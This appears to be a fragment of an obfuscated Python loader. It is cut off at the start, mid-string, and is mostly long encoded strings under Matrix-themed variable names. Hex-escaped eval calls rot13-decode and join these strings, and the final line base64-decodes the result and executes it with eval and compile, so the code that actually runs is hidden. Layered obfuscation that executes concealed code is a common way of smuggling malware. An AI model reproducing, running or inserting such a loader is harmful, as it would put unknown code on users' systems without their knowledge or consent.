RlMzk0YjY2NzA2Yzc4NTQ3OTZkNTU2NjRhNzg1MTZlMzA1YTRkNzg0NDU4NGY0ZTMxNGQ2YzU1NjIzMzM5NTY1MTY1NzU1NDY1NmUzMzM2NTY0NTM5NTQ0ZjRlMzE3MzRiNzYyYjYxNzU0NDYxNTU3MTRlNTA0YTc1NTgzMDc5Mzg0YzcwNzI2NzcxNmQ1MDM5NDc2YTYyNzE3YTQ4NmI0MzY1MzE1ODU4NGE1MzRjMzM0NjZhNDgyYjYxNTA3MzUxNGE1NTJiNmIzODUxNmU3NDZjNTg2NTRlNGY0YjRmNzMzMDU2NTQ3NjcyMmI0YjY2NmM1MjY2MmY2ODQ2NDk2NjMzNzM0NDYyNTI0YjRmMzI0NjU1MzI0MzZjMzc1MTZjMzg0Zjc2NDY0YTJmMzc3MTQyN2EzMTUwNjM1MjQ2Nzk1ODZmNDkzOTJiNTM2YzMwNTc2ZTQ0NGI1YTQ3NzMzMjc1NGI0NzYzNjQzNTc5MzI2NDUwN2E3YTQ2NzU0ZDY0Mzg3NzU3NmI2ZDcwN2E2ZTRkMzAzNTVhNDc2ZDMyNDg2ZTZhNTAyZjc3NmE2MjZkNjU3NjZhNGQ2NTcwNzM2NDcwNzU2YzczNjU3MjU3NmM1MzcxMmIzMTZiNTk0NjMyNDM1MDMyMzI1ODY1NmY0YjYxNGQ2ODM5Nzk1NzZiMzgzNzUyMzc3Nzc2NzQ1MjM4Nzg2ZTczNGE3NjJiNTYzNTQxNzYyZjZmMzkyYjQxNDMyZjY1Mzk2NjM4MmI3NjU4NDQ0ZTQ2NTU3NTc5NTI2NDUyNjIyYjU5NTI2YTY2NzE1MDQ3MzEzMDUwNjY0NTMwNzg0ZjRiNDg1MzM5NjQ3NTc2Nzk2MjRiMzI0MTM1NTA1NDM0NmYzMjY1NDc2ZjcwNzAzNjc1MzA3NzM3NzU2ZTM0NTIzMzc2NTg2NTU2NTQ2ZTYyN2EzMTc0NzAzMzMyNTI2NjJmMzE3MjQzNDU3NjZlNjI3MzcwNGE1NDM4MzI1MDY1NzQ2ZjJiMmY2MTRiNDE2NDczMzYzNDQ2NDI2ZTM2MzE3NzMyNmI3NTMyNGE3NTZmMzEzNTYzNDg2NjY1NmQ3NDU4NzI2MTYyMmI2ODcwNTczMDU4MzUzNDMzMzU0ZjUzMzU2OTc2NDg2NTcxNTQ2MzZhMzc0Mzc2Njg0NDMzNTc1NjM4MzU2ODVhMzY0MzUxNjczNTM2Nzk3MzU5NzA2YTcwMzY2MTRkNDczNTU5MzE0NTJiNjczNzM5NTYzMTUyNTk1ODMzNjU2NzZmNmI2MjVhMzM1NDUyMmI2ZjRhN2EzNzQzNTA0YjU2MmY3ODMxNzc1MzRkNDczOTczNzA1MDZhNzQ3OTczNmI1MDQ1NTg2MzU1MzQ3ODU3NmI3MDcwMzQ3MTU2MmY3NjU3NDQ2ZTY4MzU0NDU4NzE0ZjY1NzI3MjUwNzU3MjQ2Njk1ODM2Mzk2ODZlMzY0NzZkNmI3NDY3NGU0ZjM3NTM0YzYxNmQ2MTU2MmY3YTVhNDE3OTc2NzU3NTM0NTI3MjczNDM2NjM3NmQ0ZjUwMmI3NTc2NTgzNTczNmY1NDZmMzkzMDZlNzMzNTU5MzkyYjcwNzA0NDR'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))